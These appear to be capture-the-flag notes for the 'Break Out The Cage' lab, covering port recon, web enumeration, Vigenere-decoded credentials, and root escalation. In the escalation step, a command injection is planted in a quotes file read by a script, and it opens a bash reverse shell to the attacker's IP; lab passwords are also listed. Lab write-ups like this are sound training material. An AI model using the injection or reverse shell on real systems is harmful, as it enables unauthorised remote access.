# Break Out The Cage. 1
```
export ip = 10.10.98.26
```


## Recon
```
Port
1. 21 FTP
2. 22 SSH
3. 80 HTTP
```

## Web Enumerate
```
Reference : goBusterScan.txt
1. /audtions
: downloads file

2. Sonic Visualizeed 
: Pane -> spectogram -> get key
: nemelesstwo

3. vigenere text
: FTP -> base64 decode
: vigenre decoder 
:: https://www.boxentriq.com/code-breaking/vigenere-cipher
---------
Daes Tasks - The RBGE...THE CAGE... TIE MAN... THE LEGFND!!!!
One. Revamq the website
Uwo. Put more qvotes in scriqt
Three. Buy bfe pesticide
Gour. Help him xith acting lfssons
Five. Tfach Dad what "jnformation tecurity" is.

Io case I forgeu.... Mydadisghottrideraintuhatcoolnocbusehesonfisejokes
---------
```
## Credential
```
weston: Mydadisghottrideraintuhatcoolnocbusehesonfisejokes
```

## Priviliege Escalate
```
1. sudo -l
: /usr/bin/bees

2. what is interesting?
: /opt/.dads_scripts/spread_the_quotes.py
: /opt/.dads_scripts/.files/.quotes
: ; bash -c "bash -i >& /dev/tcp/10.9.26.67/4444 0>&1"

3. email_3 file backup
[vigener] :https://www.boxentriq.com/code-breaking/vigenere-cipher
1. msg : haiinspsyanileph
2. key : Face
-->  cageisnotalegend (root password)

4. su root

```